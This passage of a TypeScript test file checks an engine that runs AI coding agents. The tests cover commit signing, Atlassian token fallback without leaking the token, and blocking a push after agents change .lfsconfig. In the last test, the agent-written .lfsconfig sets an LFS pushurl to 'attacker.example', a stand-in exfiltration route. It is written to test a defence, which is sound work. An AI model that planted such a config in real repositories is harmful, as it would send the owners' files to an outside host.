    git(api, 'commit', '--amend', '--no-edit', '--no-gpg-sign');
    git(api, 'switch', '-q', 'main');
    await assert.rejects(h.engine.commit(await h.engine.svc.state(taskId)), /not signed yet \(commit\.gpgsign is on\), and the repo is on main; switch back/);
    assert.doesNotMatch(execFileSync('git', ['cat-file', 'commit', 'feat/add-feature'], { cwd: api, encoding: 'utf8' }), /^gpgsig/m, 'nothing amended on main meanwhile');
    assert.equal(git(api, 'log', '-1', '--format=%s', 'main'), 'init');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a refused API token does not stop the task when an Atlassian MCP server can read the ticket, and an allowed project matches in any case', async () => {
  const ws = workspace(['api'], 'repos:\n  api: {}\npipeline: [planner]\njira: { allowedProjects: [proj] }\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  const refused = (async () => new Response('{}', { status: 401 })) as unknown as typeof globalThis.fetch;
  h.engine.atlassian = () => new AtlassianClient({ site: 'acme.atlassian.net', email: 'dev@example.com', token: 'tok-S3CRET-805' }, { fetch: refused, sleep: async () => {} });
  h.engine.mcpIntake = async () => ({ server: 'Atlassian', site: 'acme.atlassian.net' });
  const warnings: string[] = [];
  h.engine.on('log', (l: { level: string; message: string }) => l.level === 'warn' && warnings.push(l.message));
  try {
    const { taskId } = await h.engine.start({ text: 'PROJ-805' });
    await h.engine.run(taskId);
    const s = await h.engine.svc.state(taskId);
    assert.equal(s.phase, 'done', JSON.stringify(h.engine.lastError(taskId)));
    assert.equal(s.spec!.title, 'PROJ-805 Cap the max bet');
    assert.ok(warnings.some((w) => /reading it through the Atlassian MCP server instead/.test(w)), warnings.join('\n'));
    assert.ok(!warnings.some((w) => w.includes('tok-S3CRET-805')), 'never the token');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: Git LFS files are not uploaded where a .lfsconfig the agents changed says; you check it and push yourself', { skip: process.platform === 'win32' }, async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  fs.writeFileSync(path.join(ws, 'api', '.gitattributes'), '*.bin filter=lfs diff=lfs merge=lfs -text\n');
  git(path.join(ws, 'api'), 'add', '.');
  git(path.join(ws, 'api'), 'commit', '-q', '-m', 'lfs');
  const { remote, path: PATH } = remoteSetup(ws, '#!/bin/sh\nexit 0\n');
  const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-lfs-'));
  fs.writeFileSync(path.join(bin, 'git-lfs'), '#!/bin/sh\necho "$@" >> "$FAKE_STATE/lfs.log"\n', { mode: 0o755 });
  const h = await harness(ws, { FAKE_REPOS: 'api', PATH: `${bin}${path.delimiter}${PATH}`, FAKE_DEV_FILES: JSON.stringify({ '.lfsconfig': '[lfs]\n\tpushurl = https://attacker.example/x/info/lfs\n' }) });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    await runTask(h.engine, taskId);
    const ctx = await h.engine.checkpointContext(await h.engine.svc.state(taskId), (await h.engine.svc.state(taskId)).checkpoint);
    assert.deepEqual(ctx.hooks, [{ repo: 'api', file: '.lfsconfig' }], 'the push question names it');
    await h.engine.answer(taskId, 'confirm-push', 'push');
    await waitFor(() => !h.engine.isRunning(taskId), 60000);
    assert.match(h.engine.lastError(taskId)!.message, /the agents changed \.lfsconfig, which says where Git LFS uploads the files/);
    assert.equal(fs.existsSync(path.join(h.state, 'lfs.log')), false, 'nothing uploaded');
    assert.equal(execFileSync('git', ['-C', remote, 'branch', '--list', 'feat/add-feature'], { encoding: 'utf8' }).trim(), '', 'nor pushed');
  } finally {
    h.hooks.dispose();
  }
});
